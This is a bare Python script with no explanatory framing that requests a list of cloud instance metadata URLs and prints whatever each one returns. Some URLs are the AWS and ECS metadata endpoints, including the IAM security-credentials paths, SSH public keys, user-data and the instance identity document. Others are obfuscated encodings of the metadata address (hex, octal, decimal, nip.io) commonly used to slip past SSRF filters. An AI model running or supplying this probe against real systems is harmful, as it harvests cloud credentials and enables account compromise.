import requests
from requests import RequestException
url_list = [
"http://instance-data",
"http://169.254.169.254",
"http://169.254.169.254.nip.io/",
"http://425.510.425.510/",
"http://2852039166/",
"http://7147006462/",
"http://0xA9.0xFE.0xA9.0xFE/",
"http://0xA9FEA9FE/",
"http://0x41414141A9FEA9FE/",
"http://0251.0376.0251.0376/",
"http://0251.00376.000251.0000376/",
"http://0251.254.169.254",
"http://169.254.169.254/latest/user-data",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
"http://169.254.169.254/latest/meta-data/",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
"http://169.254.169.254/latest/meta-data/ami-id",
"http://169.254.169.254/latest/meta-data/reservation-id",
"http://169.254.169.254/latest/meta-data/hostname",
"http://169.254.169.254/latest/meta-data/public-keys/",
"http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access",
"http://169.254.169.254/latest/dynamic/instance-identity/document",
"http://2852039166/latest/meta-data/",
"http://169.254.170.2/v2/credentials"]
s = requests.Session()

response_list = []

def url_loop():
    for url in url_list:
        try:
                
            with s:
                print("current url:", url)
                url_req = s.get(url, timeout=15)
                url_req_response = url_req.content
                print(url_req_response)
                response_list.append("{}:{}".format(url, url_req_response))

        except RequestException as RE:
            print(str(RE))
        # except requests.exceptions.Timeout as TE:
            # return str(TE)
    print(response_list)
print(url_loop())